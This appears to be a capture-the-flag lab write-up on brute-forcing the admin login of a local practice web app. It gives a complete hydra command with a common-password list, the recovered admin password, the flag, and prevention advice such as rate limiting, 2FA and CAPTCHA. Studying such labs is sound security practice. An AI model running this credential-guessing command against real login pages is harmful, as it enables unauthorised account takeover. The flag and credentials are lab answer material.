## 13_brute_force_admin

### How did we approach

Go to 'http://localhost:8080/index.php?page=signin'


```
hydra -s 8080 -f -l admin -P common_password.txt  localhost http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer"
```

run the command it find the flag for login: admin and password: shadow
and it show the flag

list of common weak password -> https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt


FLAG : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

### Why it is vulnerable

- weak password are used by an admin
- no protection, we try to log no matter how many times
- no protection, attackers can use hydra to try connect 
- successful brute force to log in as an admin, full access to sensitve feature of the app 

### How to prevent

- > use strong password, long, unique, complexe with different caractere type passzord, also force user to use a strong password 

- > limit longin Attemps

- > enable 2FA authentificator, second verifiacation 

- > use captcha to prevent automatic attempts log in

- > monitor login activity, to detect and alert on suspicious login attempts 